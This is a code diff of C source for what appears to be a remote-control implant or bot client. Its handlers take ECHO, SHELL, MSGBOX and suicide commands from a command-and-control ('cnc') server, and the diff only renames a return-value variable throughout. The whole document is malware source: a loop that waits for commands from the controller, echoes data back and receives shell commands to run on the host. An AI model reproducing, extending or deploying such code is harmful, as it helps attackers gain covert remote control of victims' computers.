@@ -8,12 +8,12 @@
 
 void handle_echo()
 {
-    int ret, bytes_to_read;
+    int bytes_read, bytes_to_read;
     struct echo_cmd cmd;
 
     log_info("Received ECHO command.");
-    ret = recv_from_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
-    if (ret != sizeof(cmd.bytes_remaining))
+    bytes_read = recv_from_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
+    if (bytes_read != sizeof(cmd.bytes_remaining))
     {
         log_error("Received invalid text length.");
         return;
@@ -21,9 +21,9 @@ void handle_echo()
     while (cmd.bytes_remaining)
     {
         bytes_to_read = min(cmd.bytes_remaining, sizeof(cmd.data));
-        ret = recv_from_cnc(cmd.data, bytes_to_read);
-        cmd.bytes_remaining -= ret;
-        if (send_to_cnc(cmd.data, ret) != ret)
+        bytes_read = recv_from_cnc(cmd.data, bytes_to_read);
+        cmd.bytes_remaining -= bytes_read;
+        if (send_to_cnc(cmd.data, bytes_read) != bytes_read)
         {
             log_error("Failed to echo the data.");
             return;
@@ -33,13 +33,12 @@ void handle_echo()
 
 void handle_shell()
 {
-    int ret;
     unsigned int bytes_read;
     struct shell_cmd cmd;
 
     log_info("Received SHELL command.");
-    ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
-    if (ret != sizeof(cmd.cmd_len))
+    bytes_read = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
+    if (bytes_read != sizeof(cmd.cmd_len))
     {
         log_error("Received invalid command length.");
         return;
@@ -50,8 +49,8 @@ void handle_shell()
         log_error("Failed to allocate memory for the command.");
         return;
     }
-    ret = recv_from_cnc(cmd.cmd, cmd.cmd_len);
-    if (ret != cmd.cmd_len)
+    bytes_read = recv_from_cnc(cmd.cmd, cmd.cmd_len);
+    if (bytes_read != cmd.cmd_len)
     {
         log_error("Received invalid command.");
         return;
@@ -73,13 +72,13 @@ void handle_shell()
 
 void handle_msgbox()
 {
-    int ret;
+    unsigned int bytes_read;
     struct msgbox_cmd cmd;
 
     log_info("Received MSGBOX command.");
 
-    ret = recv_from_cnc(&cmd.title_len, sizeof(cmd.title_len));
-    if (ret != sizeof(cmd.title_len))
+    bytes_read = recv_from_cnc(&cmd.title_len, sizeof(cmd.title_len));
+    if (bytes_read != sizeof(cmd.title_len))
     {
         log_error("Received invalid title length.");
         return;
@@ -90,16 +89,16 @@ void handle_msgbox()
         log_error("Failed to allocate memory for the title.");
         return;
     }
-    ret = recv_from_cnc(cmd.title, cmd.title_len);
-    if (ret != cmd.title_len)
+    bytes_read = recv_from_cnc(cmd.title, cmd.title_len);
+    if (bytes_read != cmd.title_len)
     {
         log_error("Received invalid title.");
         return;
     }
     cmd.title[cmd.title_len] = 0;
 
-    ret = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
-    if (ret != sizeof(cmd.text_len))
+    bytes_read = recv_from_cnc(&cmd.text_len, sizeof(cmd.text_len));
+    if (bytes_read != sizeof(cmd.text_len))
     {
         log_error("Received invalid text length.");
         return;
@@ -110,8 +109,8 @@ void handle_msgbox()
         log_error("Failed to allocate memory for the text.");
         return;
     }
-    ret = recv_from_cnc(cmd.text, cmd.text_len);
-    if (ret != cmd.text_len)
+    bytes_read = recv_from_cnc(cmd.text, cmd.text_len);
+    if (bytes_read != cmd.text_len)
     {
         log_error("Received invalid text.");
         return;
@@ -132,14 +131,14 @@ void handle_suicide()
 
 void listen_for_cmds()
 {
-    int ret;
+    int bytes_read;
     struct cmd cmd;
 
     while (TRUE)
     {
         log_info("Waiting for command.");
-        ret = recv_from_cnc(&cmd, sizeof(struct cmd));
-        if (ret != sizeof(struct cmd))
+        bytes_read = recv_from_cnc(&cmd, sizeof(struct cmd));
+        if (bytes_read != sizeof(struct cmd))
         {
             log_error("Received invalid command.");
             continue;
